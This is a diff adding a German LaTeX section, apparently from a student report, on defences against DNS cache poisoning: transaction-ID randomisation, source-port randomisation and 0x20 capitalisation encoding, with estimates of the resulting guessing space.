+\subsection{Versuchsreihen und Vorgehensweise}
+
+\section{Schutz gegen den Angriff}
+Das eigentliche Problem des Angriffslies sich nicht beheben ohne die Kompatibilität zum bisherigen DNS Protokoll zu verlieren, daher wurden weitere Zufallsquellen neben der bestehenden ID-Randomization eingerichtet.
+
+\subsection*{Gleichverteilte Transaktionsnummern}
+Die Transaktionsnummer ist eine 16 Bit lange Zahl die vom Ziel-Server beim erstellen der Anfrage generiert wurde. Sie muss bei der Antwort gleich lauten wie bei der Anfrage und Existierte bereits vor bekannt werden das Angriffs. Manche Implementierungen waren allerdings leicht angreifbar, da die ID nicht zufällig gewählt wurde, sondern einfach bei jeder Anfrage Inkrementiert wurde. War also die Transaktionsnummer einer vorherigen Anfrage bekannt schränkte dies die möglichen Transaktionsnummern erheblich ein. Dies wurde durch einen Pool von zufällig gewürfelten Transaktionsnummern behoben, von denen für die Anfrage zufällig eine ausgewählt wird. Sollten alle möglichen Transaktionsnummern gleichverteilt gewählt werden, ergibt sich eine Wahrscheinlichkeit von $1/2^{16}$ pro Transaktionsnummer. Das alleine reicht jedoch wie im Angriff von Kaminky gezeigt wurde nicht aus um eine verfälschung zu verhindern. 
+
+\subsection*{Port-Randomization}
+Früher wurden DNS anfragen standardmäßig über Port 53 gestellt. Dies machte es einfach gefälschte Antworten zu senden. In neueren Implementierungen wurde daher die sogenannte Source-Port-Randomization eingeführt. Hierbei wird der Ausgangsport für die Anfrage zufällig gewählt. Da es erforderlich ist, über den gleichen Port zu antworten, ergeben sich mindestens $2^{11}$ mögliche Ports. Sollten alle möglichen Ports verwendet werden, können bis zu $2^{16}$ Ports erschlossen werden. In Verbindung mit der Gleichverteilung der Transaktionsnummern ergeben sich dann $2^{16} \cdot 2^{11}$ Möglichkeiten.
+
+\subsection*{Random-URL-Capitalizing}
+Um die Möglichen Paare für den Angreifer noch weiter zu erhöhen und somit den Angriff noch Unrealistischer zu gestalten, ist eine weitere Methode das Random-URL-Capitalizing oder auch 0x20-Bit Encoding. Hierbei wird die angefragte Domain zufällig in Klein- und Großbuchstaben geschrieben. Die Groß- und Kleinschreibeung ist bei DNS anfragen äquivalent, nach RFC 1034 sollte die Schreibweise bei der Antwort alledings gleich sein wie bei der Anfrage. Die Größe des Zufalls ist hierbei von der Länge der angefragten Domain abhängig. Sei nun $|\mathit{URL}|$ die anzahl der Buchstaben in einer URL so ergeben sich $2^{|URL|}$ Moglichkeiten der Groß- und Kleinschreibung. Sollten also alle 3 Verteidigungsmechanismen verwendet werden, ergeben sich insgesamt $2^{16} \cdot 2^{11} \cdot 2^{|URL|}$ mögliche Kombinationspaare aus Transaktionsnummer, Port, und Groß- und Kleinschreibung die der Angreifer korrekt raten muss.
+
+\end{document}
